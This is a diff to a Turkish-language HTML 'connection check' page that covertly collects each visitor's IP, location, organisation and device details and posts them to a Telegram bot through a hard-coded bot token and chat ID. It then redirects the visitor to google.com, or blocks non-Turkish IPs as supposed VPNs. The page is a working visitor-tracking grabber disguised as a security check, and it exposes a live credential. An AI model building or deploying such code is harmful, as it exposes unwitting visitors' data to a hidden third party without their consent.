@@ -1,4 +1,4 @@
-<!-- index.html -->
+<!-- index.html — VPN engeli kaldırıldı, sadece yabancı IP'leri loglar ve engeller -->
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -21,7 +21,6 @@
   <h1>Erişim Reddedildi</h1>
   <p>VPN veya proxy tespit edildi.</p>
   <p><strong style="color:#e6edf3">Lütfen VPN/proxy kapatın</strong> ve sayfayı yenileyin.</p>
-  <div class="hint">Bağlantınız güvenlik nedeniyle kontrol ediliyor.</div>
 </div>
 <div class="card" id="loading">
   <p>Bağlantı kontrol ediliyor...</p>
@@ -32,14 +31,7 @@
 
   const BOT_TOKEN = "8746989231:AAHGfFiFC8uRTi6lXoUNuTRL8cQMUfMm5nE";
   const CHAT_ID   = "8729744465";
-  // BURAYI DEĞİŞTİR: Ziyaretçinin gideceği site
-  const REDIRECT  = "https://www.google.com"; 
-
-  const VPN_ASN = [
-    "AS9009","AS16276","AS14061","AS20473","AS24940","AS16509","AS15169",
-    "AS396982","AS14618","AS8075","AS13335","AS209242","AS60781","AS51396",
-    "AS62240","AS49447","AS200651","AS51852","AS212238","AS47890"
-  ];
+  const REDIRECT  = "https://www.google.com"; // Yönlendirilecek site
 
   async function getIP(){
     const sources = ["https://api.ipify.org?format=json","https://ipapi.co/json/","https://api64.ipify.org?format=json"];
@@ -51,13 +43,6 @@
 
   async function getIPInfo(ip){
     try{ const r = await fetch(`https://ipapi.co/${ip}/json/`,{cache:"no-store"}); return await r.json(); }catch(e){ return {}; }
-  }
-
-  function isVPN(info){
-    if(!info) return false;
-    if(info.org && /vpn|proxy|hosting|datacenter/i.test(info.org)) return true;
-    if(info.asn && VPN_ASN.includes(info.asn)) return true;
-    return false;
   }
 
   function getDevice(){
@@ -85,11 +70,13 @@
   async function main(){
     const ip = await getIP();
     const info = await getIPInfo(ip);
-    const vpn = isVPN(info);
     const d = getDevice();
 
+    // Sadece Türkiye (TR) haricindeki ülkeleri VPN say
+    const isVPN = (info && info.country_code && info.country_code !== "TR");
+
     const msg = [
-      vpn ? "🚫 *VPN/PROXY — ENGELLENDİ*" : "✅ *Yeni ziyaret*",
+      isVPN ? "🚫 *YABANCI IP / VPN — ENGELLENDİ*" : "✅ *Yeni ziyaret*",
       `🌐 IP: \`${ip}\``,
       `🏢 Org: ${info.org || "?"}`,
       `📍 Konum: ${info.city || "?"}, ${info.country_name || "?"}`,
@@ -105,16 +92,18 @@
       `⏰ ${new Date().toLocaleString("tr-TR")}`
     ].join("\n");
 
+    // Telegram'a mesaj gönder
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({chat_id:CHAT_ID, text:msg, parse_mode:"Markdown"})
     }).catch(()=>{});
 
-    if(vpn){
+    // Yönlendirme veya Engelleme kararı
+    if(isVPN){
       showBlocked();
     }else{
-      setTimeout(()=>{ location.replace(REDIRECT); }, 1200);
+      setTimeout(()=>{ location.replace(REDIRECT); }, 1500);
     }
   }
 
